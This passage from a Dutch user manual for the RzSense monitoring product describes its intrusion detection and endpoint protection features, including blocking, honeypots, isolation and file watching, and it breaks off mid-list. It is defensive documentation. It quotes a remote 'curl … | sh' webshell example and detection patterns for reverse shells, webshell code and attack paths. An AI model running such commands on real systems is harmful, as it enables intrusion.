# Beveiliging: IDS, EDR en bescherming

Dit hoofdstuk gaat over alles waarmee RzSense je servers en netwerk beschermt. Het begint met het IDS
(inbraakdetectie): wat het meldt, hoe het blokkeert en waar je alles terugvindt. Daarna komen endpoint-bewaking (EDR),
afwijkingen en aanvalsketens, dreigingsinformatie, uitzonderingen, ransomware, onbekende programma's, jagen op sporen en
tijdelijk sudo. Daarna de bescherming van je reverse proxy (WAF, ClamAV, Suricata) en wat er van buiten open staat. Tot slot
e-mailbeveiliging van je domein, datalekken en NIS2.

Hoe en wanneer het IDS je een pushmelding stuurt, en het beveiligingskanaal, staan in [Meldingen](03-meldingen.md). De
onderdelen die alleen voor Windows gelden, staan bij de [Windows-agent](06-windows-agent.md). Logins, `sudo` en `su` op je
servers (*Toegang*) staan bij de [Linux-agent](05-linux-agent.md).

In dit hoofdstuk heet het venster dat je opent door op een server te klikken op de pagina *Servers* de **Agent Manager**.

## Hoe het IDS werkt in vijf minuten

**Wat het is.** De agent op elke Linux-server let op tekenen van een inbraak: gewijzigde gevoelige bestanden, nieuwe
gebruikers en poorten, verdachte processen en verbindingen, brute force op SSH, aanvallen in de logs van je webdiensten.
RzSense vergelijkt dat met wat normaal is op die server en maakt er een **incident** van als iets niet klopt.

**Leren of blokkeren.** Het IDS heeft twee standen:

| Modus | Wat er gebeurt |
|---|---|
| 🎓 **Leren** (standaard) | Alles wordt gemeld, er wordt niets geblokkeerd of gestopt. Bij elk incident staat wat RzSense in de modus Blokkeren zou hebben gedaan. |
| ⛔ **Blokkeren** | Aanvallers worden in de firewall van de server gezet, verdachte processen kunnen worden gestopt en een server kan worden geïsoleerd, afhankelijk van wat je aanzet. |

Begin altijd met *Leren*. Kijk een paar dagen wat er gemeld wordt, handel af wat normaal is, en schakel pas daarna over.

**Wat er gemeld wordt**, in het kort:

| Soort | Voorbeelden |
|---|---|
| Inloggen | brute force op SSH, een login na brute force, root-login, login vanaf een nieuw IP of van buiten, honeypot-namen |
| Bestanden | wijzigingen aan `/etc/sudoers`, `/etc/passwd`, `authorized_keys`, crontabs, systemd-units; je eigen bewaakte paden |
| Processen | programma's uit `/tmp` of `/dev/shm`, reverse shells, webshells, cryptominers, onbekende programma's |
| Netwerk | nieuwe luisterpoorten, verbindingen naar bekende aanvallers of ongewone landen, Suricata-alerts, verdachte DNS |
| Web | aanvalspaden, scanners en exploits in de logs van je reverse proxy, Home Assistant en Vaultwarden |
| Afwijkingen en ketens | iets wat de server nog nooit deed, en meldingen die samen op een aanval wijzen |

De volledige lijst staat bij [Wat het IDS meldt](#wat-het-ids-meldt).

**Waar je het ziet:**

| Plek | Wat er staat |
|---|---|
| *IDS → Aanvallen* | dezelfde lijst als *IDS → Aanvallen*: het werk dat je moet afhandelen |
| *IDS → 🚨 Aanvallen* | alle IDS-incidenten, met zoeken, filters en status-labels |
| *IDS → ⛔ Blokkades* | wat nu geblokkeerd is, eerdere blokkades en de ✅ whitelist |
| *IDS → 🛰️ Live* | wat de agents de laatste 3 dagen op het moment zelf zagen (endpoint-bewaking) |
| *IDS → 🗺️ Aanvalskaart* | waar aanvallen vandaan komen, wat ze raken en of ze geblokkeerd zijn |
| *IDS → 📊 Analyse* | *Overzicht* (kerncijfers, servers, aanvallen per dag), *Afwijkingen* en *MITRE* |
| *IDS → Meer* | *🔑 Toegang* (logins, sudo, SSH-sessies), *🧩 Programma's* en *🔎 Jagen* |
| *Instellingen → Bescherming* | alle instellingen, en bij *Beschermingen* alles op een rij |

Een rood bolletje op **IDS** in de zijbalk telt de open critical incidenten.

**Zo begin je:**

1. Ga naar *Instellingen → IDS en EDR → IDS algemeen* en zet **IDS aan**. De modus blijft op 🎓 *Leren*.
2. Wacht de **basismeting** af (standaard 1 dag). In die tijd legt RzSense stil vast wat normaal is.
3. Kijk een paar dagen op *IDS → Aanvallen*. Klik bij wat normaal is op **Dit is normaal**.
4. Bekijk *Instellingen → IDS en EDR → Beschermingen* en zet aan of uit wat je wilt.
5. Schakel naar ⛔ *Blokkeren*. Doe dat de eerste keer terwijl je ook via de console bij je servers kunt.

## Het IDS aanzetten

Alles staat op *Instellingen → IDS en EDR → IDS algemeen*:

- **IDS aan**: standaard uit. Uit betekent: de agents verzamelen niets en er wordt niets geblokkeerd.
- **🎓 Leren / ⛔ Blokkeren**: overschakelen naar Blokkeren vraagt je wachtwoord (op je LAN zonder account typ je
  `BLOKKEREN`) en komt in het logboek. De modus staat ook als pil rechts in de tellerbalk van de IDS-pagina; klik erop om
  hem te wijzigen.
- **Basismeting (dagen)**: hoe lang RzSense eerst alleen vastlegt wat normaal is (standaard 1 dag).
- **Brute force bij … mislukte SSH-logins … binnen (minuten)**: standaard 10 binnen 10 minuten vanaf één IP.
- **Blokkeren (uren)** en **Bij herhaling (dagen)**: hoe lang een automatische blokkade duurt (zie
  [Blokkeren en whitelist](#blokkeren-en-whitelist)).
- **Automatische blokkades op alle servers** (standaard aan): wordt een aanvaller op één server automatisch geblokkeerd
  (brute force, honeypot), dan blokkeren al je servers met het IDS op *Blokkeren* hem ook. Een botnet probeert meestal al
  je servers. Met de hand blokkeren geldt alleen voor de server die je kiest.
- **🍯 Honeypot**, **📁 Bestanden bewaken** en **🔑 Toegang**: zie hieronder en bij de [Linux-agent](05-linux-agent.md).

Het wekelijkse IDS-overzicht stel je in bij *Instellingen → Meldingen en rapporten → Rapporten* (zie
[Meldingen](03-meldingen.md)).

## Wat het IDS meldt

| Melding | Ernst |
|---|---|
| Nieuw of gewijzigd: `/etc/sudoers(.d)`, `/root/.ssh/authorized_keys`, `/etc/ld.so.preload`, `/etc/pam.d/*` | 🔴 critical |
| Nieuw of gewijzigd: `/etc/passwd`, `shadow`, `group`, sshd-config, crontabs en `/etc/cron.d`, `authorized_keys` van gebruikers, eigen systemd-services en -timers, `rc.local`, `/etc/profile.d`, `/etc/hosts`, `/etc/resolv.conf`, `/etc/environment`, `at`-jobs, `.bashrc`/`.bash_profile`/`.profile` van root, systemd-gebruikersunits | 🟠 warning |
| Lid erbij van een groep die (bijna) root is: `wheel`, `sudo`, `docker`, `root`, `adm`, `lxd` | 🔴 critical |
| Tweede root-account (UID 0) | 🔴 critical |
| Nieuwe gebruiker, nieuwe luisterende poort | 🟠 warning |
| Nieuw SUID-programma, nieuwe kernelmodule, gewijzigd programmabestand van een pakket (`rpm -Va` / `debsums`, dagelijks) | 🟠 warning |
| Programma dat draait vanuit `/tmp`, `/dev/shm` of `/var/tmp`, of van een verwijderd bestand | 🔴 critical |
| Programma zonder bestand (memfd) | 🟠 warning |
| Mogelijke reverse shell: een shell of `nc`/`socat` met een verbinding naar buiten | 🔴 critical |
| Mogelijke webshell: een webserver start een shell of een programma als `curl` | 🔴 critical |
| Verbinding naar een bekende malware-poort (1337, 4444, 31337 …) | 🟠 warning |
| Uitgaande verbinding naar een bekende aanvaller | 🔴 critical |
| Uitgaande verbinding naar een land buiten je normale landen | 🟠 warning |
| Nieuwe automatisch startende dienst of timer | 🟠 warning |
| Aanval in de log van je reverse proxy, Home Assistant of Vaultwarden | 🟠 warning |
| Beveiliging verslechterd (een hardening-punt dat goed was, is nu fout) | 🟠 warning; 🔴 bij lege wachtwoorden of de Docker-socket |
| Brute force op SSH (standaard 10 mislukte logins binnen 10 minuten vanaf één IP) | 🟠 warning |
| Inlog na brute force: eerst veel mislukte pogingen, daarna een geslaagde login vanaf hetzelfde IP | 🔴 critical |
| Root-login via SSH, login vanaf een IP dat nog nooit inlogde | 🟠 warning |
| SSH-login van buiten je eigen netwerken | 🟠 warning; 🔴 vanuit een land buiten je normale landen of vanaf een bekende aanvaller |
| Honeypot: inlogpoging met een honeypot-naam, of verbinding met de honeypot-poort | 🟠 van buiten; 🔴 vanaf je eigen netwerk |
| Open poort met een actief misbruikte kwetsbaarheid (KEV-lijst van CISA) | 🔴 critical |

Daarnaast melden endpoint-bewaking, afwijkingen, ketens, dreigingsinformatie, Suricata, YARA, ransomware, onbekende
programma's en jagen op sporen hun eigen incidenten. Die staan verderop.

**Geslaagde logins:**
- **Van buiten** je netwerk: een incident *SSH-login van buiten*. Dezelfde gebruiker vanaf hetzelfde IP binnen 24 uur telt
  op (*3×*). Het blijft open tot je **✔ Gezien** of **Dit is normaal** kiest (dan niet meer voor die gebruiker en dat IP
  op die server).
- **Van binnen** (je *Lokale netwerken*) en aan de **console**: een systeembericht *SSH-login* of *Console-login*. Per
  kanaal in te stellen bij *Instellingen → Meldingen en rapporten → Systeemmeldingen → Login op een server, van binnen*.
- Geeft een login al een incident (*Root-login*, *nieuw IP*, *Inlog na brute force*), dan komt er niets dubbel bij.
- Login-incidenten van binnen (*nieuw IP*, *Root-login*) sluiten na 24 uur vanzelf. Die van buiten blijven open, en
  *Inlog na brute force* ook.
- Gebruikers en IP's in de lijst *Negeren* (bij *Toegang*) geven geen login-incident of bericht.

**Open poort met een actief misbruikte kwetsbaarheid**: luistert een pakket met een kwetsbaarheid van de KEV-lijst op een
poort, dan is dat critical, met de update die het oplost. Daarvoor moet de scan bij
[Kwetsbaarheden](09-kwetsbaarheden-en-updates.md) aan staan. Elke 6 uur per server bekeken; een genegeerde kwetsbaarheid
telt niet.

Dezelfde melding binnen 24 uur wordt niet opnieuw gestuurd; de teller loopt op (*5×*).

## De pagina IDS

### Tabbladen

| Tabblad | Wat je er doet |
|---|---|
| 🚨 **Aanvallen** | Incidenten bekijken en afhandelen. Zoeken, chips per soort (*Poorten, Bestanden, Processen, Logins, Honeypot* …) en per status, **⛔ IP blokkeren**. |
| ⛔ **Blokkades** | Wat nu geblokkeerd is, deblokkeren, eerder geblokkeerd, en de ✅ whitelist. |
| 🛰️ **Live** | Wat de agents op het moment zelf zien (zie [Endpoint-bewaking](#endpoint-bewaking-edr)). |
| 🗺️ **Aanvalskaart** | Attack Flow en wereldkaart (zie [Aanvalskaart](#aanvalskaart)). |
| 📊 **Analyse** | *Overzicht*, *🧬 Afwijkingen* en *🧭 MITRE*. |
| **Meer** | *🔑 Toegang*, *🧩 Programma's*, *🔎 Jagen*, en een snelkoppeling naar *🛡 Bescherming*. |

Het laatst gekozen tabblad wordt per apparaat onthouden.

### Overzicht

Bovenaan de pagina staan tellers (open critical en warning, nu geblokkeerd, logins en mislukte logins in 24 uur) en de
modus. Klik op een teller om naar het juiste tabblad te gaan. Het tabblad *Analyse → Overzicht* toont:

- een **score-tegel** met de gemiddelde **hardening-score** en de toestand: 🔴 *Actie nodig*, 🟠 *Aandacht* of 🟢 *Rustig*;
- **Nu aandacht nodig**: de open critical-incidenten en aanvalsketens met **✔ Afhandelen** en **⛔**;
- de **servers** met open incidenten als kaart (open, critical, geblokkeerd, hardening, een staafje per dag); rustige
  servers staan eronder als korte regel. Per server zie je ook de modus, de basismeting, of de firewall werkt
  (*✔ bewaakt · blokkeren actief*, *alleen melden*, *alleen detecteren* of een fout) en hoeveel bestanden bewaakt worden;
- **📊 Aanvallen per dag** (14 dagen, per soort) met daaronder wat het IDS deed en de **meest actieve aanvallers** van 24
  uur. Je eigen netwerk telt niet mee;
- **Webverkeer** van 24 uur: verzoeken, percentage tegengehouden en aantal aanvallers.

Hoe het overzicht eruitziet, hangt af van je lay-out (L1nes of Bloxzz). Liever de oude, compacte weergave? Zet
**Moderne weergave** uit bij *Mijn account → Weergave*.

### Een incident openen

Klik op een incident voor een venster met alles op één plek:

- **Wat is dit?** en **Hoe erg is het?** in gewone taal.
- **Waarom**, **Trigger** en **Actie**: de regel met de drempel, de feiten die hem deden afgaan (aantallen, IP,
  gebruiker, programma, bestand …) en wat RzSense deed, met de stand van nu (*IP geblokkeerd tot …*, *proces 4242 wordt
  gestopt* → *gestopt ✔*, *server geïsoleerd tot …*). In de modus Leren: *alleen gemeld (modus Leren; in Blokkeren: IP
  blokkeren)*. Pushmeldingen krijgen dezelfde drie regels.
- **Was jij dit?** bij logins, nieuwe gebruikers en dergelijke. *Ja, dat was ik* handelt het af als normaal; *Nee* toont
  meteen de **noodstappen** (IP blokkeren, gebruiker vergrendelen, server isoleren) met de commando's.
- **Wat te doen** en **Voorkomen**: stappen met commando's om te kopiëren (📋), ingevuld met de gebruiker, het bestand
  of het IP uit het incident.
- **Over het IP-adres**: land, DNS-naam (alleen als die terug naar hetzelfde IP wijst), eigenaar en netwerk (via RDAP),
  het abuse-adres, of het een hosting- of VPN-netwerk is, een bekende aanvaller of een van je eigen servers, en hoe vaak
  het al op je servers is gezien. Alleen het IP-adres gaat naar rdap.org; het resultaat wordt 7 dagen bewaard.
  *↻ Opnieuw opzoeken* haalt het meteen opnieuw op.
- Bij een incident met een IP staat bovenaan een kort verhaal (pogingen, blokkade, laatste gebeurtenissen) met
  *Alles over dit IP*.
- **Knoppen**: afhandelen, *Dit is normaal* of heropenen, ⛔ blokkeren, ✅ whitelist, 🕑 tijdlijn, 🔒 gebruiker
  vergrendelen, 🧯 isoleren, de beveiliging van de server en de Agent Manager.

**Gebundelde incidenten.** Gelijke incidenten (dezelfde soort, dezelfde server, achter elkaar) staan als één regel met een
blauw bolletje (*8×*). Klik op het bolletje om ze open te klappen, of op de titel voor het venster. Met **✔ Afhandelen (8)**
handel je ze in één keer af. In het venster blader je met de nummers onderaan of de pijltjestoetsen ← →; na
*Afhandelen*, *Dit is normaal* of *Heropenen* gaat het venster door naar het volgende open incident. Een paars bolletje
(*3×*) betekent dat één incident vaker is gezien; met **Gebeurtenis 1 2 3 …** kies je welke je ziet.

### Status van een melding

Vooraan elke beveiligingsmelding staat één label met wat er gebeurde:

| Label | Betekenis |
|---|---|
| ⛔ **Geblokkeerd** · tot … | het IP kan er nu niet meer in (firewall of proxy) |
| 🛡️ **Tegengehouden** | dit verzoek of proces is gestopt; het IP zelf niet |
| ⏳ **Wordt gestopt** | de agent voert het bij zijn volgende ronde uit |
| 🧱 **Geïsoleerd** | de server is van het netwerk gehaald |
| ⚠️ **Doorgelaten – mogelijk gelukt** | de app gaf een gewoon antwoord (2xx/3xx) op een aanval: kijk of het lukte |
| 👁 **Alleen gemeld** | doorgelaten, er is niets tegen gedaan (ernst te laag, of blokkeren staat uit) |
| 🎓 **Leren** | modus Leren: in Blokkeren was hier ingegrepen |
| ✅ **Toegestaan** | je eigen netwerk, de whitelist of RzSense zelf: nooit geblokkeerd |
| ↩ **Gedeblokkeerd** / ⌛ **Blokkade verlopen** | was geblokkeerd, nu niet meer |
| ✘ **Mislukt** | de actie lukte niet |

Onder de filterbalk staan chips per status met aantallen; klik er een aan om alleen die meldingen te zien. Bij *Alleen
gemeld*, *Mogelijk gelukt*, *Leren* en een verlopen blokkade staat de knop **⛔ Blokkeren** op de regel.

## Blokkeren en whitelist

- De agent gebruikt een **eigen nftables-tabel** `inet rzmon`, naast firewalld of je eigen regels. Je bestaande firewall
  wordt niet aangepast. Bekijken op de server:
  ```
  nft list table inet rzmon
  ```
- **Automatisch** (brute force, honeypot, webaanvallen …): **24 uur**. Was hetzelfde IP de afgelopen 30 dagen al eens
  geblokkeerd, dan **7 dagen**. Beide aan te passen bij *IDS algemeen*. Permanent blokkeren gaat alleen met de hand.
- **Met de hand**: **⛔ Blokkeer IP** bij een incident of een regel in *Toegang*, of **⛔ IP blokkeren** bovenaan de
  pagina IDS. Kies 24 uur, 7 dagen, 30 dagen of permanent. Dat geldt alleen voor de server die je kiest.
- **Nooit geblokkeerd**: je LAN (privé-adressen), RzSense zelf en de ✅ **whitelist** (*IDS → Blokkades*, onderaan). Een
  LAN-adres kun je wel zelf blokkeren; je eigen IP-adres niet. De whitelist geldt voor RzSense én het IDS op al je
  servers. Andere monitoring (Home Assistant, Uptime Kuma …) zet je erop.
- **🔓 Deblokkeren** bij *IDS → Blokkades*. De agent past het binnen een minuut aan.
- **Terug naar Leren** of **IDS uit**: de agent haalt zijn tabel meteen weg. In RzSense blijven de blokkades staan, zodat
  ze terugkomen als je weer blokkeert.
- **Op één server nooit blokkeren**: zet `IDS_BLOCK=0` in `/etc/default/rzmon-agent`. Die server meldt wel, maar
  blokkeert niet.
- **Docker en Podman**: verkeer naar containers met gepubliceerde poorten loopt via *forward*. Voor de weblogs blokkeert
  de agent vóór Docker (prerouting), zodat ook verkeer naar bijvoorbeeld SWAG wordt tegengehouden. Andere blokkades
  gelden niet altijd voor containers.

## Basismeting en "Dit is normaal"

- Krijgt het IDS voor het eerst een rapport van een server, dan legt het eerst vast wat normaal is (*Basismeting*,
  standaard 1 dag). Wat er in die tijd verandert, wordt stil opgenomen.
- **Dit is normaal** bij een incident: afhandelen, en die melding komt op die server niet meer terug.
- **↺ basismeting opnieuw** (bij de server op de pagina IDS): na een grote wijziging, zoals een upgrade, alles opnieuw als
  normaal vastleggen. Dat geldt ook voor de bewaakte bestanden.
- Na een pakketupdate zie je soms meldingen over gewijzigde bestanden. Klopt het, kies dan **✔ Afhandelen**.

## Honeypot

Een honeypot is lokaas: namen en een poort die alleen aanvallers proberen. Eén poging is genoeg. Instellen bij
*Instellingen → IDS en EDR → IDS algemeen → 🍯 Honeypot*.

- **Honeypot-gebruikers**: namen die bij jou nooit bestaan. Standaard
  `admin test guest user oracle ubuntu pi ftp support postgres`; vul gerust aan. Eén mislukte SSH-login met zo'n naam van
  buiten en het IP wordt meteen geblokkeerd (in de modus Blokkeren). Bestaat de naam op een server echt (bv. `postgres`),
  dan geldt hij daar niet als honeypot.
- **Honeypot-poort** (standaard TCP **2323**, leeg = uit): elke verbinding is een scanner. Er luistert niets: de agent zet
  een regel in `inet rzmon` die het IP onthoudt en de verbinding stil weggooit. Werkt ook in de modus Leren (dan alleen
  melden). Is de poort op een server al in gebruik, dan zie je dat bij die server op de pagina IDS. RzSense zelf (bv. een
  poortscan) telt niet mee.
- **Vanaf je eigen netwerk** is het 🔴 critical: een apparaat in je LAN dat dit doet, is waarschijnlijk besmet (camera,
  slimme stekker). LAN-adressen worden nooit automatisch geblokkeerd.

## Webshell en persistentie

Instellen bij *Instellingen → IDS en EDR → IDS per server*.

- **Webshell**: een webserver (nginx, apache, php-fpm, lighttpd, caddy …) of webgebruiker (`www-data`, `apache` …) start
  een shell of een netwerkprogramma (`curl`, `wget`, `nc`, `python`, `perl` …). Dat hoort nooit; meestal is via een lek
  in een website een opdracht uitgevoerd. Altijd critical. PHP-mail via `sendmail` telt niet.
  - *Voorbeeld:* via een lek in een WordPress-plugin laat een aanvaller de site `sh -c "curl http://…/x.sh | sh"`
    uitvoeren. De agent ziet `php-fpm` → `sh` → `curl` en RzSense meldt *Mogelijke webshell: php-fpm start sh*.
- **Proces meteen stoppen** (modus Blokkeren, standaard uit): de agent stopt het proces bij zijn volgende ronde. Hij
  controleert eerst of het nog precies hetzelfde proces is (nummer én starttijd).
- **✅ Vrijgeven** bij het incident: is het toch normaal (een beheerpaneel dat scripts start), dan wordt dezelfde
  combinatie daarna niet meer gemeld of gestopt.
- **Nieuwe automatisch startende dienst of timer**: elke 10 minuten bekijkt de agent de ingeschakelde systemd-services en
  -timers. Een nieuwe is een warning: zo blijft een aanvaller na een herstart aanwezig. Tijdens een pakketupdate wordt
  het stil vastgelegd.

## Bekende aanvallers, landen en uitgaand verkeer

Instellen bij *Instellingen → IDS en EDR → Netwerk en weblogs*.

- **☠️ Bekende aanvallers** (standaard aan): RzSense haalt dagelijks **Spamhaus DROP** en **FireHOL level 1** op. Privé-
  adressen en je whitelist worden er altijd uit gefilterd.
  - In de modus **Blokkeren** zetten de agents ze **vooraf** in hun firewall: die adressen komen niet eens tot een
    inlogpoging.
  - In de modus **Leren** krijgen logins, incidenten en het weekoverzicht van zo'n adres het label ☠️. Een geslaagde
    SSH-login vanaf zo'n adres is altijd critical.
- **🌍 Land per IP-adres** (standaard aan): RzSense haalt maandelijks **DB-IP Lite** op en zoekt het land op de eigen
  server op; er gaat per login niets naar buiten. Bij logins, incidenten en blokkades staat een vlag.
  - **Normale landen** (standaard `NL`, bv. `NL BE DE`, of tijdelijk je vakantieland): een SSH-login van buiten vanuit een
    ander land is critical.
  - **Nu bijwerken** haalt de lijsten en de landen meteen op.
- **🌐 Uitgaande verbindingen**: de agent meldt elke minuut met welke adressen buiten je netwerk de server verbindt, per
  programma.
  - Naar een **bekende aanvaller**: critical. Dat wijst bijna altijd op malware (cryptominer, command-and-control).
  - Naar een **land buiten je normale landen**: warning, per programma en land. Tijdens de basismeting leert het IDS dat
    stil aan. Later toch normaal? Klik *Dit is normaal*.
  - **Uitgaand blokkeren** (modus Blokkeren, standaard uit): verkeer naar bekende aanvallers wordt ook uitgaand
    tegengehouden, ook vanuit containers.
  - Een adres vrijgeven doe je met de ✅ whitelist (1, 7, 30 dagen of altijd).

## Hardening-score

De agent controleert elk uur de basisbeveiliging van de server. RzSense maakt er een score van 0 tot 100 van. Aan of uit
bij *Instellingen → IDS en EDR → IDS per server*.

- **Wat wordt gecontroleerd**: SSH met wachtwoord, als root of met lege wachtwoorden; een actieve firewall; automatische
  beveiligingsupdates; databases open op alle netwerken (MySQL, PostgreSQL, Redis, MongoDB, Elasticsearch …); de
  Docker-socket; accounts zonder wachtwoord en sudo zonder wachtwoord; `/tmp` met `noexec`; SELinux.
- Daarnaast **25 controles uit de CIS Benchmarks**: SSH-instellingen, rechten van `/etc/shadow`, `/etc/passwd`,
  `/etc/crontab` en `grub.cfg`, wachtwoordbeleid, umask, een tweede UID 0, kernelinstellingen (ASLR, SYN-cookies),
  auditd, tijdsynchronisatie, bestanden die iedereen kan wijzigen, FTP/telnet/rsh, `/dev/shm` met `noexec`. Ze staan
  per CIS-hoofdstuk; alleen het hoofdstuk wordt genoemd, want de nummers verschillen per distributie.
- **Klik op de score** voor de lijst. Elk punt heeft **Wat is het?**, **Controleren** (een commando), **Oplossen**
  (commando's om te kopiëren) en een **⚠️ Let op** (bv. eerst een SSH-sleutel testen voordat je wachtwoorden uitzet). Per
  server kun je een punt **negeren**.
- **Wordt een punt slechter** (iemand zet root-login via SSH weer aan), dan volgt een incident. Een punt dat al fout was,
  geeft alleen een lagere score.

## Logs van webdiensten

De agent leest elke minuut de nieuwe regels uit de logs van je webdiensten en vat ze per IP samen. RzSense herkent er
aanvallen in. Instellen bij *Instellingen → IDS en EDR → Netwerk en weblogs → 📜 Logs van webdiensten*.

**Bronnen** (elk aan of uit):
- **Reverse proxy / webserver**: de access-log van nginx (SWAG, Nginx Proxy Manager of een gewone nginx);
- **Home Assistant**: mislukte logins;
- **Vaultwarden**: *Username or password is incorrect*.

Laat het pad leeg of op `auto`, dan zoekt de agent zelf (in de SWAG-container, gangbare mappen, via de Supervisor van Home
Assistant, of via Docker/Podman). Je kunt ook een pad of containernaam invullen. Onder de velden zie je per server wat
gevonden is.

**Scenario's** (elk aan of uit, aantallen aan te passen):

| Scenario | Wanneer |
|---|---|
| Bekend aanvalspad met een foutcode (`/.env`, `/.git/`, `wp-login.php`, `phpmyadmin`, `/cgi-bin/` …) | meteen; je echte `wp-login.php` (200) telt niet |
| Scanner (sqlmap, nikto, nuclei, zgrab …) | meteen |
| Veel 404 | standaard 20 binnen de tijd |
| Veel 401/403 (wachtwoorden raden) | standaard 10 |
| Zonder hostnaam (444: iemand scant je IP-adres) | standaard 5 |
| Mislukte logins in Home Assistant of Vaultwarden | standaard 5 |

De tijd is standaard 10 minuten. Met **blokkeren** aan wordt zo'n IP in de modus Blokkeren op al je servers geblokkeerd.
Je eigen netwerk en de whitelist nooit.

*Voorbeeld:* om 03:12 vraagt `45.148.10.12` op SWAG `/.env` op (404). RzSense meldt *Web: aanvalspad /.env* en blokkeert
het IP op al je servers. Je apps achter SWAG zijn meteen beschermd.

**Home Assistant achter SWAG** ziet zonder `use_x_forwarded_for: true` en `trusted_proxies` alleen het IP van SWAG. RzSense
herkent dat en zet een ⚠️ bij de gevonden log.

### Het hele pad van een webaanval

In een incident *Web: …* staat het blok **Pad van de aanval**: aanvaller → reverse proxy → website → dienst erachter, met
een oordeel: *Niet gelukt* (de proxy weigerde, 444), *Waarschijnlijk niet gelukt* (alleen foutcodes) of ⚠️ *Let op* (een
gewoon antwoord, 2xx of 3xx: kijk of er iets gevonden is).

De gewone access-log van nginx heeft de site en de dienst niet. Daarom:
- **SWAG** of **nginx**: zet één keer een **extra logbestand** aan. De twee regels (een `log_format rzsense` en een
  `access_log …/rzsense.log rzsense;` voor het blok `http { … }` in `nginx.conf`) staan kant-en-klaar bij
  *Instellingen → IDS en EDR → Netwerk en weblogs*, met Kopiëren. Herstart daarna SWAG (`docker restart swag`) of herlaad
  nginx. Je bestaande `access.log` blijft zoals hij is, dus fail2ban blijft werken.
- **Nginx Proxy Manager**: niets te doen.

**Privacy**: het extra logbestand bevat geen gebruikersnaam en geen *referer*. Tokens, wachtwoorden, sleutels en
handtekeningen in een adres (`?token=…`, `password=…`, `api_key=…`, `sig=…`) lakt de agent weg (`token=***`) voordat iets
de server verlaat, en RzSense doet dat nog een keer. Wil je alles op schijf versleuteld, gebruik dan schijfversleuteling
(LUKS).

## Bestanden bewaken

Naast de vaste gevoelige bestanden laat je zelf paden bewaken: je scripts, je webroot, configuratie. De agent houdt per
bestand de SHA-256-hash, grootte, rechten en eigenaar bij. De inhoud wordt nooit verstuurd.

**Instellen:**
1. *Instellingen → IDS en EDR → IDS algemeen → 📁 Bestanden bewaken*: een pad per regel, met de ernst 🟠 of 🔴. Die
   lijst geldt voor alle servers.
2. Per server voeg je paden toe via *✎ Bewerken* van de server (*📁 Bestanden bewaken (IDS)*). Hetzelfde pad daar gaat
   voor, bijvoorbeeld om de ernst te veranderen.
3. **＋ Aanbevolen** toont gangbare mappen die op je servers staan (`/usr/local/bin`, `/opt`, `/etc/nginx`, `/var/www`…).
   Bij een webroot wordt dat `…/**/*.php` als 🔴, om webshells te vangen.

**Paden**: een map (helemaal, met submappen), een bestand, of jokertekens (`*`, en `**` voor elke diepte, bv.
`/var/www/**/*.php`). Niet toegestaan: `/`, `/proc`, `/sys`, `/dev` en `/run`. **Uitsluiten**: namen, mappen of paden,
standaard `*.log *.tmp *.swp *.pid cache/ sessions/`.

**Grenzen**: 20 paden in de algemene lijst en 20 per server, 10.000 bestanden per server. Boven 100 MB alleen grootte en
tijd, geen hash.

**Hoe vaak**: elke minuut een snelle controle op grootte, tijd, rechten en eigenaar; alleen bij een verschil een nieuwe
hash. Eén keer per dag alles opnieuw hashen, zodat ook een bestand met een teruggezette tijd opvalt.

| Wijziging | Ernst |
|---|---|
| Nieuw, inhoud gewijzigd of verwijderd | die van het pad |
| Rechten of eigenaar gewijzigd | die van het pad; 🔴 als er SUID of SGID bij kwam |
| Meer dan 10 wijzigingen onder één pad tegelijk | één incident met de lijst |

- **✔ Wijziging goedkeuren** (of **✔ Alles goedkeuren**): de nieuwe stand is de norm.
- **🚫 Niet meer bewaken**: dit bestand (of bij een bundel dat pad) voortaan overslaan.
- Bij een nieuw pad wordt eerst alles stil vastgelegd. Pakketupdates worden hier niet overgeslagen.
- Mislukt een rapport, dan komt de wijziging bij het volgende rapport alsnog binnen.
- Werkt op Linux-servers en TrueNAS SCALE, niet in de Home Assistant-add-on.

## Ingrijpen bij een inbraak

### Server isoleren

Bij een hack zet je de server met één klik in quarantaine: alleen RzSense, je lokale netwerken en jouw IP-adres kunnen er
nog bij. Al het andere verkeer stopt: inkomend, uitgaand en van containers. De DNS-servers blijven bereikbaar, zodat de
agent RzSense kan vinden.

1. Open het incident of de hardening-score van de server en kies **🧯 Isoleren**.
2. Kies **1 uur, 4 uur, 1 dag of 3 dagen**.
3. Bevestig met je wachtwoord (op je LAN zonder account typ je `ISOLEREN`).

**Goed om te weten:**
- Het **vervalt vanzelf**. De agent heft het zelf op, ook als RzSense onbereikbaar is, zodat je jezelf nooit voorgoed
  buitensluit. De agent gebruikt een eigen tabel `inet rzmon_iso`.
- Eerder **🔓 Opheffen** vraagt ook je wachtwoord (op je LAN: `OPHEFFEN`), want het haalt bescherming weg. Alleen
  beheerders zien de knop.
- Isoleren en opheffen geven **altijd** een melding via alle kanalen, ook tijdens stille uren.
- Zolang een server geïsoleerd is, is de zijbalk rood omrand en staat bovenaan de pagina IDS een rode banner
  *SERVER IN ISOLATIE*: met de reden, door wie, sinds wanneer, of de agent het al toepaste en een afteller. Op het
  Dashboard en Monitoring staat een smallere versie.

### Gebruiker vergrendelen

**🔒 Gebruiker vergrendelen** zet een account op slot (geen wachtwoord, geen SSH-sleutel, `usermod -L -e 1`) en stopt al
zijn processen. Bijvoorbeeld als een account is overgenomen. Root kan niet. **Vrijgeven** zet het weer open.

### Tijdlijn per IP

Klik op een IP-adres (op *Meldingen*, *IDS* of bij *Blokkades*) voor alles wat RzSense van dat adres weet, over al je
servers: incidenten, logins en mislukte pogingen, blokkades en het opheffen ervan, en logins op RzSense zelf. Bovenaan
staan het land, of het een bekende aanvaller is, of het op de whitelist staat en waar het nu geblokkeerd is.

## Endpoint-bewaking (EDR)

De agent kijkt op het moment zelf mee op de server, niet pas bij het volgende rapport. RzSense toetst wat hij ziet aan
regels en grijpt zo nodig in.

**Wat de agent ziet:**
- **processen**: elk nieuw programma met opdracht, ouder, gebruiker en map (via `auditd`);
- **gevoelige paden**: wie aankomt aan `passwd`, `shadow`, `sudoers`, `ld.so.preload`, cron, systemd-units en
  `/root/.ssh`, en het laden van kernelmodules;
- **netwerk**: nieuwe uitgaande verbindingen en luisterpoorten, met het programma;
- **bestanden**: nieuwe bestanden in `/tmp`, `/var/tmp`, `/dev/shm` en de webmappen (via `inotify-tools`): grootte, of
  het een programma is, SHA-256 en verdachte code (`eval(base64_decode(`, `system($_GET` …);
- **containers**: starten, `exec` en `--privileged` (Docker en Podman);
- **webverzoeken** via je reverse proxy (payload-inspectie, zie hieronder).

**Regels:**
- de **eigen regels van RzSense**: webshell, reverse shell, *download en uitvoeren* (`curl … | sh`), programma's uit
